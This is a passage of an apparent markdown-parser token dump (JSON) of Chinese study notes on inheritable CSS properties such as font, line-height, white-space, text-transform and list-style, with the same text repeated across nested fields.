px、em、rem 等单位。\\n\\n+ white-space\\n  white-space 用于控制元素内文本的空白字符处理方式。它决定了文本中的空格、换行等如何展示；常见值：\\n    normal：默认值，连续空白字符会合并为一个空格，文本会自动换行\\n    nowrap：文本不会换行，所有空白字符会被合并为一个空格\\n    pre：保留空格和换行符，类似于 `<pre>` 标签的效果\\n    pre-wrap：保留空格和换行符，文本会自动换行\\n    pre-line：合并多个空白字符，但保留换行符\\n\\n+ line-height\\n  line-height 用于设置文本行与行之间的垂直间距。它控制行之间的间隔，通常用于改善文本的可读性；常见值：\\n    normal：默认的行高，通常为字体大小的 1.2 倍。\\n    number：指定行高为字体大小的倍数。\\n    length：指定固定的行高值，如 20px、1.5em。\\n    percentage：指定行高为字体大小的百分比。\\n\\n+ color\\n  color 用于设置文本的颜色，常见值：\\n    color：任何有效的颜色值，例如 red、#ff0000、rgb(255, 0, 0)、rgba(255, 0, 0, 0.5)。\\n\\n+ font\\n\\n  font 是一个简写属性，用于设置字体相关的多个属性。它可以同时设置字体系列、字体样式、字体粗细、字体大小等；常见值：\\n    font-style、font-variant、font-weight、font-size、line-height、font-family\\n+ font-size\\n  font-size 用于设置文本的大小；常见值：\\n    length：如 12px、1em、0.75rem。\\n    percentage：相对于父元素的字体大小，如 150%。\\n    medium：默认字体大小。\\n    larger / smaller：相对于父元素字体大小的大小调整。\\n\\n+ font-style\\n  font-style 用于设置文本的样式，通常用于斜体文本；常见值：\\n    normal：正常样式\\n    italic：斜体\\n    oblique：倾斜字体，通常与 italic 类似，但不是正式的斜体字形\\n\\n+ font-variant\\n  font-variant 用于控制文本是否使用变体字体；常见值：\\n    normal：正常字体。\\n    small-caps：小型大写字母，通常用于显示大写字母，但它们比普通大写字母小。\\n\\n+ font-weight\\n  font-weight 用于设置文本的粗细；常见值：\\n    normal：正常的字体粗细\\n    bold：加粗字体\\n    bolder：比父元素更粗\\n    lighter：比父元素更细\\n    number：可以指定 100 到 900 之间的数值，例如 400 是正常粗细，700 是加粗\\n\\n+ text-decoration\\n  text-decoration 用于设置文本的装饰效果，如下划线、删除线等；常见值：\\n    none：无装饰\\n    underline：下划线\\n    overline：上划线\\n    line-through：删除线\\n    blink：闪烁的文本（大多数浏览器已不支持）\\n\\n+ text-transform\\n  text-transform 用于控制文本的大小写转换；常见值：\\n    none：不转换大小写\\n    capitalize：将每个单词的首字母转换为大写\\n    uppercase：将所有字母转换为大写\\n    lowercase：将所有字母转换为小写\\n\\n+ direction\\n  direction 用于设置文本的书写方向；常见值：\\n    ltr：从左到右（默认）\\n    rtl：从右到左，通常用于阿拉伯语、希伯来语等语言\\n","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"+ letter-spacing\\n  letter-spacing 用于设置文本中字符之间的间距。它控制字母之间的距离，可以让文本看起来更加紧凑或更加宽松，常见值：\\n    normal：默认的字符间距，通常为 0\\n    length：指定字符间的间距，可以使用单位如 px、em、rem 等。例如，2px 或 0.1em\\n\\n","task":false,"loose":true,"text":"letter-spacing\\nletter-spacing 用于设置文本中字符之间的间距。它控制字母之间的距离，可以让文本看起来更加紧凑或更加宽松，常见值：\\n  normal：默认的字符间距，通常为 0\\n  length：指定字符间的间距，可以使用单位如 px、em、rem 等。例如，2px 或 0.1em\\n","tokens":[{"type":"text","raw":"letter-spacing\\n\\nletter-spacing 用于设置文本中字符之间的间距。它控制字母之间的距离，可以让文本看起来更加紧凑或更加宽松，常见值：\\n\\n  normal：默认的字符间距，通常为 0\\n\\n  length：指定字符间的间距，可以使用单位如 px、em、rem 等。例如，2px 或 0.1em\\n","text":"letter-spacing\\nletter-spacing 用于设置文本中字符之间的间距。它控制字母之间的距离，可以让文本看起来更加紧凑或更加宽松，常见值：\\n  normal：默认的字符间距，通常为 0\\n  length：指定字符间的间距，可以使用单位如 px、em、rem 等。例如，2px 或 0.1em","tokens":[{"type":"text","raw":"letter-spacing\\nletter-spacing 用于设置文本中字符之间的间距。它控制字母之间的距离，可以让文本看起来更加紧凑或更加宽松，常见值：\\n  normal：默认的字符间距，通常为 0\\n  length：指定字符间的间距，可以使用单位如 px、em、rem 等。例如，2px 或 0.1em","text":"letter-spacing\\nletter-spacing 用于设置文本中字符之间的间距。它控制字母之间的距离，可以让文本看起来更加紧凑或更加宽松，常见值：\\n  normal：默认的字符间距，通常为 0\\n  length：指定字符间的间距，可以使用单位如 px、em、rem 等。例如，2px 或 0.1em","escaped":false}]}]},{"type":"list_item","raw":"+ word-spacing\\n  word-spacing 用于设置单词之间的间距。它控制单词之间的空白区域，可以增加或减少单词间的空隙。\\n  常见值：\\n    normal：默认的单词间距。\\n    length：指定单词间距，可以使用 px、em、rem 等单位。\\n\\n","task":false,"loose":true,"text":"word-spacing\\nword-spacing 用于设置单词之间的间距。它控制单词之间的空白区域，可以增加或减少单词间的空隙。\\n常见值：\\n  normal：默认的单词间距。\\n  length：指定单词间距，可以使用 px、em、rem 等单位。\\n","tokens":[{"type":"text","raw":"word-spacing\\n\\nword-spacing 用于设置单词之间的间距。它控制单词之间的空白区域，可以增加或减少单词间的空隙。\\n\\n常见值：\\n\\n  normal：默认的单词间距。\\n\\n  length：指定单词间距，可以使用 px、em、rem 等单位。\\n","text":"word-spacing\\nword-spacing 用于设置单词之间的间距。它控制单词之间的空白区域，可以增加或减少单词间的空隙。\\n常见值：\\n  normal：默认的单词间距。\\n  length：指定单词间距，可以使用 px、em、rem 等单位。","tokens":[{"type":"text","raw":"word-spacing\\nword-spacing 用于设置单词之间的间距。它控制单词之间的空白区域，可以增加或减少单词间的空隙。\\n常见值：\\n  normal：默认的单词间距。\\n  length：指定单词间距，可以使用 px、em、rem 等单位。","text":"word-spacing\\nword-spacing 用于设置单词之间的间距。它控制单词之间的空白区域，可以增加或减少单词间的空隙。\\n常见值：\\n  normal：默认的单词间距。\\n  length：指定单词间距，可以使用 px、em、rem 等单位。","escaped":false}]}]},{"type":"list_item","raw":"+ white-space\\n  white-space 用于控制元素内文本的空白字符处理方式。它决定了文本中的空格、换行等如何展示；常见值：\\n    normal：默认值，连续空白字符会合并为一个空格，文本会自动换行\\n    nowrap：文本不会换行，所有空白字符会被合并为一个空格\\n    pre：保留空格和换行符，类似于 `<pre>` 标签的效果\\n    pre-wrap：保留空格和换行符，文本会自动换行\\n    pre-line：合并多个空白字符，但保留换行符\\n\\n","task":false,"loose":true,"text":"white-space\\nwhite-space 用于控制元素内文本的空白字符处理方式。它决定了文本中的空格、换行等如何展示；常见值：\\n  normal：默认值，连续空白字符会合并为一个空格，文本会自动换行\\n  nowrap：文本不会换行，所有空白字符会被合并为一个空格\\n  pre：保留空格和换行符，类似于 `<pre>` 标签的效果\\n  pre-wrap：保留空格和换行符，文本会自动换行\\n  pre-line：合并多个空白字符，但保留换行符\\n","tokens":[{"type":"text","raw":"white-space\\n\\nwhite-space 用于控制元素内文本的空白字符处理方式。它决定了文本中的空格、换行等如何展示；常见值：\\n\\n  normal：默认值，连续空白字符会合并为一个空格，文本会自动换行\\n\\n  nowrap：文本不会换行，所有空白字符会被合并为一个空格\\n\\n  pre：保留空格和换行符，类似于 `<pre>` 标签的效果\\n\\n  pre-wrap：保留空格和换行符，文本会自动换行\\n\\n  pre-line：合并多个空白字符，但保留换行符\\n","text":"white-space\\nwhite-space 用于控制元素内文本的空白字符处理方式。它决定了文本中的空格、换行等如何展示；常见值：\\n  normal：默认值，连续空白字符会合并为一个空格，文本会自动换行\\n  nowrap：文本不会换行，所有空白字符会被合并为一个空格\\n  pre：保留空格和换行符，类似于 `<pre>` 标签的效果\\n  pre-wrap：保留空格和换行符，文本会自动换行\\n  pre-line：合并多个空白字符，但保留换行符","tokens":[{"type":"text","raw":"white-space\\nwhite-space 用于控制元素内文本的空白字符处理方式。它决定了文本中的空格、换行等如何展示；常见值：\\n  normal：默认值，连续空白字符会合并为一个空格，文本会自动换行\\n  nowrap：文本不会换行，所有空白字符会被合并为一个空格\\n  pre：保留空格和换行符，类似于 ","text":"white-space\\nwhite-space 用于控制元素内文本的空白字符处理方式。它决定了文本中的空格、换行等如何展示；常见值：\\n  normal：默认值，连续空白字符会合并为一个空格，文本会自动换行\\n  nowrap：文本不会换行，所有空白字符会被合并为一个空格\\n  pre：保留空格和换行符，类似于 ","escaped":false},{"type":"codespan","raw":"`<pre>`","text":"<pre>"},{"type":"text","raw":" 标签的效果\\n  pre-wrap：保留空格和换行符，文本会自动换行\\n  pre-line：合并多个空白字符，但保留换行符","text":" 标签的效果\\n  pre-wrap：保留空格和换行符，文本会自动换行\\n  pre-line：合并多个空白字符，但保留换行符","escaped":false}]}]},{"type":"list_item","raw":"+ line-height\\n  line-height 用于设置文本行与行之间的垂直间距。它控制行之间的间隔，通常用于改善文本的可读性；常见值：\\n    normal：默认的行高，通常为字体大小的 1.2 倍。\\n    number：指定行高为字体大小的倍数。\\n    length：指定固定的行高值，如 20px、1.5em。\\n    percentage：指定行高为字体大小的百分比。\\n\\n","task":false,"loose":true,"text":"line-height\\nline-height 用于设置文本行与行之间的垂直间距。它控制行之间的间隔，通常用于改善文本的可读性；常见值：\\n  normal：默认的行高，通常为字体大小的 1.2 倍。\\n  number：指定行高为字体大小的倍数。\\n  length：指定固定的行高值，如 20px、1.5em。\\n  percentage：指定行高为字体大小的百分比。\\n","tokens":[{"type":"text","raw":"line-height\\n\\nline-height 用于设置文本行与行之间的垂直间距。它控制行之间的间隔，通常用于改善文本的可读性；常见值：\\n\\n  normal：默认的行高，通常为字体大小的 1.2 倍。\\n\\n  number：指定行高为字体大小的倍数。\\n\\n  length：指定固定的行高值，如 20px、1.5em。\\n\\n  percentage：指定行高为字体大小的百分比。\\n","text":"line-height\\nline-height 用于设置文本行与行之间的垂直间距。它控制行之间的间隔，通常用于改善文本的可读性；常见值：\\n  normal：默认的行高，通常为字体大小的 1.2 倍。\\n  number：指定行高为字体大小的倍数。\\n  length：指定固定的行高值，如 20px、1.5em。\\n  percentage：指定行高为字体大小的百分比。","tokens":[{"type":"text","raw":"line-height\\nline-height 用于设置文本行与行之间的垂直间距。它控制行之间的间隔，通常用于改善文本的可读性；常见值：\\n  normal：默认的行高，通常为字体大小的 1.2 倍。\\n  number：指定行高为字体大小的倍数。\\n  length：指定固定的行高值，如 20px、1.5em。\\n  percentage：指定行高为字体大小的百分比。","text":"line-height\\nline-height 用于设置文本行与行之间的垂直间距。它控制行之间的间隔，通常用于改善文本的可读性；常见值：\\n  normal：默认的行高，通常为字体大小的 1.2 倍。\\n  number：指定行高为字体大小的倍数。\\n  length：指定固定的行高值，如 20px、1.5em。\\n  percentage：指定行高为字体大小的百分比。","escaped":false}]}]},{"type":"list_item","raw":"+ color\\n  color 用于设置文本的颜色，常见值：\\n    color：任何有效的颜色值，例如 red、#ff0000、rgb(255, 0, 0)、rgba(255, 0, 0, 0.5)。\\n\\n","task":false,"loose":true,"text":"color\\ncolor 用于设置文本的颜色，常见值：\\n  color：任何有效的颜色值，例如 red、#ff0000、rgb(255, 0, 0)、rgba(255, 0, 0, 0.5)。\\n","tokens":[{"type":"text","raw":"color\\n\\ncolor 用于设置文本的颜色，常见值：\\n\\n  color：任何有效的颜色值，例如 red、#ff0000、rgb(255, 0, 0)、rgba(255, 0, 0, 0.5)。\\n","text":"color\\ncolor 用于设置文本的颜色，常见值：\\n  color：任何有效的颜色值，例如 red、#ff0000、rgb(255, 0, 0)、rgba(255, 0, 0, 0.5)。","tokens":[{"type":"text","raw":"color\\ncolor 用于设置文本的颜色，常见值：\\n  color：任何有效的颜色值，例如 red、#ff0000、rgb(255, 0, 0)、rgba(255, 0, 0, 0.5)。","text":"color\\ncolor 用于设置文本的颜色，常见值：\\n  color：任何有效的颜色值，例如 red、#ff0000、rgb(255, 0, 0)、rgba(255, 0, 0, 0.5)。","escaped":false}]}]},{"type":"list_item","raw":"+ font\\n\\n  font 是一个简写属性，用于设置字体相关的多个属性。它可以同时设置字体系列、字体样式、字体粗细、字体大小等；常见值：\\n    font-style、font-variant、font-weight、font-size、line-height、font-family\\n","task":false,"loose":true,"text":"font\\n\\nfont 是一个简写属性，用于设置字体相关的多个属性。它可以同时设置字体系列、字体样式、字体粗细、字体大小等；常见值：\\n  font-style、font-variant、font-weight、font-size、line-height、font-family","tokens":[{"type":"text","raw":"font","text":"font","tokens":[{"type":"text","raw":"font","text":"font","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"font 是一个简写属性，用于设置字体相关的多个属性。它可以同时设置字体系列、字体样式、字体粗细、字体大小等；常见值：\\n\\n  font-style、font-variant、font-weight、font-size、line-height、font-family","text":"font 是一个简写属性，用于设置字体相关的多个属性。它可以同时设置字体系列、字体样式、字体粗细、字体大小等；常见值：\\n  font-style、font-variant、font-weight、font-size、line-height、font-family","tokens":[{"type":"text","raw":"font 是一个简写属性，用于设置字体相关的多个属性。它可以同时设置字体系列、字体样式、字体粗细、字体大小等；常见值：\\n  font-style、font-variant、font-weight、font-size、line-height、font-family","text":"font 是一个简写属性，用于设置字体相关的多个属性。它可以同时设置字体系列、字体样式、字体粗细、字体大小等；常见值：\\n  font-style、font-variant、font-weight、font-size、line-height、font-family","escaped":false}]}]},{"type":"list_item","raw":"+ font-size\\n  font-size 用于设置文本的大小；常见值：\\n    length：如 12px、1em、0.75rem。\\n    percentage：相对于父元素的字体大小，如 150%。\\n    medium：默认字体大小。\\n    larger / smaller：相对于父元素字体大小的大小调整。\\n\\n","task":false,"loose":true,"text":"font-size\\nfont-size 用于设置文本的大小；常见值：\\n  length：如 12px、1em、0.75rem。\\n  percentage：相对于父元素的字体大小，如 150%。\\n  medium：默认字体大小。\\n  larger / smaller：相对于父元素字体大小的大小调整。\\n","tokens":[{"type":"text","raw":"font-size\\n\\nfont-size 用于设置文本的大小；常见值：\\n\\n  length：如 12px、1em、0.75rem。\\n\\n  percentage：相对于父元素的字体大小，如 150%。\\n\\n  medium：默认字体大小。\\n\\n  larger / smaller：相对于父元素字体大小的大小调整。\\n","text":"font-size\\nfont-size 用于设置文本的大小；常见值：\\n  length：如 12px、1em、0.75rem。\\n  percentage：相对于父元素的字体大小，如 150%。\\n  medium：默认字体大小。\\n  larger / smaller：相对于父元素字体大小的大小调整。","tokens":[{"type":"text","raw":"font-size\\nfont-size 用于设置文本的大小；常见值：\\n  length：如 12px、1em、0.75rem。\\n  percentage：相对于父元素的字体大小，如 150%。\\n  medium：默认字体大小。\\n  larger / smaller：相对于父元素字体大小的大小调整。","text":"font-size\\nfont-size 用于设置文本的大小；常见值：\\n  length：如 12px、1em、0.75rem。\\n  percentage：相对于父元素的字体大小，如 150%。\\n  medium：默认字体大小。\\n  larger / smaller：相对于父元素字体大小的大小调整。","escaped":false}]}]},{"type":"list_item","raw":"+ font-style\\n  font-style 用于设置文本的样式，通常用于斜体文本；常见值：\\n    normal：正常样式\\n    italic：斜体\\n    oblique：倾斜字体，通常与 italic 类似，但不是正式的斜体字形\\n\\n","task":false,"loose":true,"text":"font-style\\nfont-style 用于设置文本的样式，通常用于斜体文本；常见值：\\n  normal：正常样式\\n  italic：斜体\\n  oblique：倾斜字体，通常与 italic 类似，但不是正式的斜体字形\\n","tokens":[{"type":"text","raw":"font-style\\n\\nfont-style 用于设置文本的样式，通常用于斜体文本；常见值：\\n\\n  normal：正常样式\\n\\n  italic：斜体\\n\\n  oblique：倾斜字体，通常与 italic 类似，但不是正式的斜体字形\\n","text":"font-style\\nfont-style 用于设置文本的样式，通常用于斜体文本；常见值：\\n  normal：正常样式\\n  italic：斜体\\n  oblique：倾斜字体，通常与 italic 类似，但不是正式的斜体字形","tokens":[{"type":"text","raw":"font-style\\nfont-style 用于设置文本的样式，通常用于斜体文本；常见值：\\n  normal：正常样式\\n  italic：斜体\\n  oblique：倾斜字体，通常与 italic 类似，但不是正式的斜体字形","text":"font-style\\nfont-style 用于设置文本的样式，通常用于斜体文本；常见值：\\n  normal：正常样式\\n  italic：斜体\\n  oblique：倾斜字体，通常与 italic 类似，但不是正式的斜体字形","escaped":false}]}]},{"type":"list_item","raw":"+ font-variant\\n  font-variant 用于控制文本是否使用变体字体；常见值：\\n    normal：正常字体。\\n    small-caps：小型大写字母，通常用于显示大写字母，但它们比普通大写字母小。\\n\\n","task":false,"loose":true,"text":"font-variant\\nfont-variant 用于控制文本是否使用变体字体；常见值：\\n  normal：正常字体。\\n  small-caps：小型大写字母，通常用于显示大写字母，但它们比普通大写字母小。\\n","tokens":[{"type":"text","raw":"font-variant\\n\\nfont-variant 用于控制文本是否使用变体字体；常见值：\\n\\n  normal：正常字体。\\n\\n  small-caps：小型大写字母，通常用于显示大写字母，但它们比普通大写字母小。\\n","text":"font-variant\\nfont-variant 用于控制文本是否使用变体字体；常见值：\\n  normal：正常字体。\\n  small-caps：小型大写字母，通常用于显示大写字母，但它们比普通大写字母小。","tokens":[{"type":"text","raw":"font-variant\\nfont-variant 用于控制文本是否使用变体字体；常见值：\\n  normal：正常字体。\\n  small-caps：小型大写字母，通常用于显示大写字母，但它们比普通大写字母小。","text":"font-variant\\nfont-variant 用于控制文本是否使用变体字体；常见值：\\n  normal：正常字体。\\n  small-caps：小型大写字母，通常用于显示大写字母，但它们比普通大写字母小。","escaped":false}]}]},{"type":"list_item","raw":"+ font-weight\\n  font-weight 用于设置文本的粗细；常见值：\\n    normal：正常的字体粗细\\n    bold：加粗字体\\n    bolder：比父元素更粗\\n    lighter：比父元素更细\\n    number：可以指定 100 到 900 之间的数值，例如 400 是正常粗细，700 是加粗\\n\\n","task":false,"loose":true,"text":"font-weight\\nfont-weight 用于设置文本的粗细；常见值：\\n  normal：正常的字体粗细\\n  bold：加粗字体\\n  bolder：比父元素更粗\\n  lighter：比父元素更细\\n  number：可以指定 100 到 900 之间的数值，例如 400 是正常粗细，700 是加粗\\n","tokens":[{"type":"text","raw":"font-weight\\n\\nfont-weight 用于设置文本的粗细；常见值：\\n\\n  normal：正常的字体粗细\\n\\n  bold：加粗字体\\n\\n  bolder：比父元素更粗\\n\\n  lighter：比父元素更细\\n\\n  number：可以指定 100 到 900 之间的数值，例如 400 是正常粗细，700 是加粗\\n","text":"font-weight\\nfont-weight 用于设置文本的粗细；常见值：\\n  normal：正常的字体粗细\\n  bold：加粗字体\\n  bolder：比父元素更粗\\n  lighter：比父元素更细\\n  number：可以指定 100 到 900 之间的数值，例如 400 是正常粗细，700 是加粗","tokens":[{"type":"text","raw":"font-weight\\nfont-weight 用于设置文本的粗细；常见值：\\n  normal：正常的字体粗细\\n  bold：加粗字体\\n  bolder：比父元素更粗\\n  lighter：比父元素更细\\n  number：可以指定 100 到 900 之间的数值，例如 400 是正常粗细，700 是加粗","text":"font-weight\\nfont-weight 用于设置文本的粗细；常见值：\\n  normal：正常的字体粗细\\n  bold：加粗字体\\n  bolder：比父元素更粗\\n  lighter：比父元素更细\\n  number：可以指定 100 到 900 之间的数值，例如 400 是正常粗细，700 是加粗","escaped":false}]}]},{"type":"list_item","raw":"+ text-decoration\\n  text-decoration 用于设置文本的装饰效果，如下划线、删除线等；常见值：\\n    none：无装饰\\n    underline：下划线\\n    overline：上划线\\n    line-through：删除线\\n    blink：闪烁的文本（大多数浏览器已不支持）\\n\\n","task":false,"loose":true,"text":"text-decoration\\ntext-decoration 用于设置文本的装饰效果，如下划线、删除线等；常见值：\\n  none：无装饰\\n  underline：下划线\\n  overline：上划线\\n  line-through：删除线\\n  blink：闪烁的文本（大多数浏览器已不支持）\\n","tokens":[{"type":"text","raw":"text-decoration\\n\\ntext-decoration 用于设置文本的装饰效果，如下划线、删除线等；常见值：\\n\\n  none：无装饰\\n\\n  underline：下划线\\n\\n  overline：上划线\\n\\n  line-through：删除线\\n\\n  blink：闪烁的文本（大多数浏览器已不支持）\\n","text":"text-decoration\\ntext-decoration 用于设置文本的装饰效果，如下划线、删除线等；常见值：\\n  none：无装饰\\n  underline：下划线\\n  overline：上划线\\n  line-through：删除线\\n  blink：闪烁的文本（大多数浏览器已不支持）","tokens":[{"type":"text","raw":"text-decoration\\ntext-decoration 用于设置文本的装饰效果，如下划线、删除线等；常见值：\\n  none：无装饰\\n  underline：下划线\\n  overline：上划线\\n  line-through：删除线\\n  blink：闪烁的文本（大多数浏览器已不支持）","text":"text-decoration\\ntext-decoration 用于设置文本的装饰效果，如下划线、删除线等；常见值：\\n  none：无装饰\\n  underline：下划线\\n  overline：上划线\\n  line-through：删除线\\n  blink：闪烁的文本（大多数浏览器已不支持）","escaped":false}]}]},{"type":"list_item","raw":"+ text-transform\\n  text-transform 用于控制文本的大小写转换；常见值：\\n    none：不转换大小写\\n    capitalize：将每个单词的首字母转换为大写\\n    uppercase：将所有字母转换为大写\\n    lowercase：将所有字母转换为小写\\n\\n","task":false,"loose":true,"text":"text-transform\\ntext-transform 用于控制文本的大小写转换；常见值：\\n  none：不转换大小写\\n  capitalize：将每个单词的首字母转换为大写\\n  uppercase：将所有字母转换为大写\\n  lowercase：将所有字母转换为小写\\n","tokens":[{"type":"text","raw":"text-transform\\n\\ntext-transform 用于控制文本的大小写转换；常见值：\\n\\n  none：不转换大小写\\n\\n  capitalize：将每个单词的首字母转换为大写\\n\\n  uppercase：将所有字母转换为大写\\n\\n  lowercase：将所有字母转换为小写\\n","text":"text-transform\\ntext-transform 用于控制文本的大小写转换；常见值：\\n  none：不转换大小写\\n  capitalize：将每个单词的首字母转换为大写\\n  uppercase：将所有字母转换为大写\\n  lowercase：将所有字母转换为小写","tokens":[{"type":"text","raw":"text-transform\\ntext-transform 用于控制文本的大小写转换；常见值：\\n  none：不转换大小写\\n  capitalize：将每个单词的首字母转换为大写\\n  uppercase：将所有字母转换为大写\\n  lowercase：将所有字母转换为小写","text":"text-transform\\ntext-transform 用于控制文本的大小写转换；常见值：\\n  none：不转换大小写\\n  capitalize：将每个单词的首字母转换为大写\\n  uppercase：将所有字母转换为大写\\n  lowercase：将所有字母转换为小写","escaped":false}]}]},{"type":"list_item","raw":"+ direction\\n  direction 用于设置文本的书写方向；常见值：\\n    ltr：从左到右（默认）\\n    rtl：从右到左，通常用于阿拉伯语、希伯来语等语言","task":false,"loose":true,"text":"direction\\ndirection 用于设置文本的书写方向；常见值：\\n  ltr：从左到右（默认）\\n  rtl：从右到左，通常用于阿拉伯语、希伯来语等语言","tokens":[{"type":"text","raw":"direction\\n\\ndirection 用于设置文本的书写方向；常见值：\\n\\n  ltr：从左到右（默认）\\n\\n  rtl：从右到左，通常用于阿拉伯语、希伯来语等语言","text":"direction\\ndirection 用于设置文本的书写方向；常见值：\\n  ltr：从左到右（默认）\\n  rtl：从右到左，通常用于阿拉伯语、希伯来语等语言","tokens":[{"type":"text","raw":"direction\\ndirection 用于设置文本的书写方向；常见值：\\n  ltr：从左到右（默认）\\n  rtl：从右到左，通常用于阿拉伯语、希伯来语等语言","text":"direction\\ndirection 用于设置文本的书写方向；常见值：\\n  ltr：从左到右（默认）\\n  rtl：从右到左，通常用于阿拉伯语、希伯来语等语言","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 列表元素可继承的属性\\n  + list-style\\n    list-style 是一个简写属性，用于设置列表项的标记类型、位置等。它同时设置 list-style-type、list-style-position 和 list-style-image；常见值：\\n      list-style-type：标记类型，如 disc、circle、square、decimal、none 等。\\n      list-style-position：标记的位置，inside 或 outside。\\n      list-style-image：指定列表项标记为图片。\\n\\n  + list-style-type\\n    list-style-type 用于设置列表项的标记类型；常见值：\\n      disc：实心圆点（默认）\\n      circle：空心圆点\\n      square：方块\\n      decimal：数字列表（如 1, 2, 3）\\n      none：没有标记\\n\\n  + list-style-position\\n    list-style-position 用于设置列表标记的位置；常见值：\\n      outside：标记在列表项外部（默认）\\n      inside：标记在列表项内部\\n\\n  + list-style-image\\n    list-style-image 用于设置列表项标记为自定义图像；常见值：`url(<image-url>)：指定图像的 URL，如 url(\'bullet.png\')`","task":false,"loose":true,"text":"**1：** 列表元素可继承的属性\\n+ list-style\\n  list-style 是一个简写属性，用于设置列表项的标记类型、位置等。它同时设置 list-style-type、list-style-position 和 list-style-image；常见值：\\n    list-style-type：标记类型，如 disc、circle、square、decimal、none 等。\\n    list-style-position：标记的位置，inside 或 outside。\\n    list-style-image：指定列表项标记为图片。\\n\\n+ list-style-type\\n  list-style-type 用于设置列表项的标记类型；常见值：\\n    disc：实心圆点（默认）\\n    circle：空心圆点\\n    square：方块\\n    decimal：数字列表（如 1, 2, 3）\\n    none：没有标记\\n\\n+ list-style-position\\n  list-style-position 用于设置列表标记的位置；常见值：\\n    outside：标记在列表项外部（默认）\\n    inside：标记在列表项内部\\n\\n+ list-style-image\\n  list-style-image 用于设置列表项标记为自定义图像；常见值：`url(<image-url>)：指定图像的 URL，如 url(\'bullet.png\')`","tokens":[{"type":"text","raw":"**1：** 列表元素可继承的属性\\n","text":"**1：** 列表元素可继承的属性","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 列表元素可继承的属性","text":" 列表元素可继承的属性","escaped":false}]},{"type":"list","raw":"+ list-style\\n  list-style 是一个简写属性，用于设置列表项的标记类型、位置等。它同时设置 list-style-type、list-style-position 和 list-style-image；常见值：\\n    list-style-type：标记类型，如 disc、circle、square、decimal、none 等。\\n    list-style-position：标记的位置，inside 或 outside。\\n    list-style-image：指定列表项标记为图片。\\n\\n+ list-style-type\\n  list-style-type 用于设置列表项的标记类型；常见值：\\n    disc：实心圆点（默认）\\n    circle：空心圆点\\n    square：方块\\n    decimal：数字列表（如 1, 2, 3）\\n    none：没有标记\\n\\n+ list-style-position\\n  list-style-position 用于设置列表标记的位置；常见值：\\n    outside：标记在列表项外部（默认）\\n    inside：标记在列表项内部\\n\\n+ list-style-image\\n  list-style-image 用于设置列表项标记为自定义图像；常见值：`url(<image-url>)：指定图像的 URL，如 url(\'bullet.png\')`","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"+ list-style\\n  list-style 是一个简写属性，用于设置列表项的标记类型、位置等。它同时设置 list-style-type、list-style-position 和 list-style-image；常见值：\\n    list-style-type：标记类型，如 disc、circle、square、decimal、none 等。\\n    list-style-position：标记的位置，inside 或 outside。\\n    list-style-image：指定列表项标记为图片。\\n\\n","task":false,"loose":true,"text":"list-style\\nlist-style 是一个简写属性，用于设置列表项的标记类型、位置等。它同时设置 list-style-type、list-style-position 和 list-style-image；常见值：\\n  list-style-type：标记类型，如 disc、circle、square、decimal、none 等。\\n  list-style-position：标记的位置，inside 或 outside。\\n  list-style-image：指定列表项标记为图片。\\n","tokens":[{"type":"text","raw":"list-style\\n\\nlist-style 是一个简写属性，用于设置列表项的标记类型、位置等。它同时设置 list-style-type、list-style-position 和 list-style-image；常见值：\\n\\n  list-style-type：标记类型，如 disc、circle、square、decimal、none 等。\\n\\n  list-style-position：标记的位置，inside 或 outside。\\n\\n  list-style-image：指定列表项标记为图片。\\n","text":"list-style\\nlist-style 是一个简写属性，用于设置列表项的标记类型、位置等。它同时设置 list-style-type、list-style-position 和 list-style-image；常见值：\\n  list-style-type：标记类型，如 disc、circle、square、decimal、none 等。\\n  list-style-position：标记的位置，inside 或 outside。\\n  list-style-image：指定列表项标记为图片。","tokens":[{"type":"text","raw":"list-style\\nlist-style 是一个简写属性，用于设置列表项的标记类型、位置等。它同时设置 list-style-type、list-style-position 和 list-style-image；常见值：\\n  list-style-type：标记类型，如 disc、circle、square、decimal、none 等。\\n  list-style-position：标记的位置，inside 或 outside。\\n  list-style-image：指定列表项标记为图片。","text":"list-style\\nlist-style 是一个简写属性，用于设置列表项的标记类型、位置等。它同时设置 list-style-type、list-style-position 和 list-style-image；常见值：\\n  list-style-type：标记类型，如 disc、circle、square、decimal、none 等。\\n  list-style-position：标记的位置，inside 或 outside。\\n  list-style-image：指定列表项标记为图片。","escaped":false}]}]},{"type":"list_item","raw":"+ list-style-type\\n  list-style-type 用于设置列表项的标记类型；常见值：\\n    disc：实心圆点（默认）\\n    circle：空心圆点\\n    square：方块\\n    decimal：数字列表（如 1, 2, 3）\\n    none：没有标记\\n\\n","task":false,"loose":true,"text":"list-style-type\\nlist-style-type 用于设置列表项的标记类型；常见值：\\n  disc：实心圆点（默认）\\n  circle：空心圆点\\n  square：方块\\n  decimal：数字列表（如 1, 2, 3）\\n  none：没有标记\\n","tokens":[{"type":"text","raw":"list-style-type\\n\\nlist-style-type 用于设置列表项的标记类型；常见值：\\n\\n  disc：实心圆点（默认）\\n\\n  circle：空心圆点\\n\\n  square：方块\\n\\n  decimal：数字列表（如 1, 2, 3）\\n\\n  none：没有标记\\n","text":"list-style-type\\nlist-style-type 用于设置列表项的标记类型；常见值：\\n  disc：实心圆点（默认）\\n  circle：空心圆点\\n  square：方块\\n  decimal：数字列表（如 1, 2, 3）\\n  none：没有标记","tokens":[{"type":"text","raw":"list-style-type\\nlist-style-type 用于设置列表项的标记类型；常见值：\\n  disc：实心圆点（默认）\\n  circle：空心圆点\\n  square：方块\\n  decimal：数字列表（如 1, 2, 3）\\n  none：没有标记","text":"list-style-type\\nlist-style-type 用于设置列表项的标记类型；常见值：\\n  disc：实心圆点（默认）\\n  circle：空心圆点\\n  square：方块\\n  decimal：数字列表（如 1, 2, 3）\\n  none：没有标记","escaped":false}]}]},{"type":"list_item","raw":"+ list-style-position\\n  list-style-position 用于设置列表标记的位置；常见值：\\n    outside：标记在列表项外部（默认）\\n    inside：标记在列表项内部\\n\\n","task":false,"loose":true,"text":"list-style-position\\nlist-style-position 用于设置列表标记的位置；常见值：\\n  outside：标记在列表项外部（默认）\\n  inside：标记在列表项内部\\n","tokens":[{"type":"text","raw":"list-style-position\\n\\nlist-style-position 用于设置列表标记的位置；常见值：\\n\\n  outside：标记在列表项外部（默认）\\n\\n  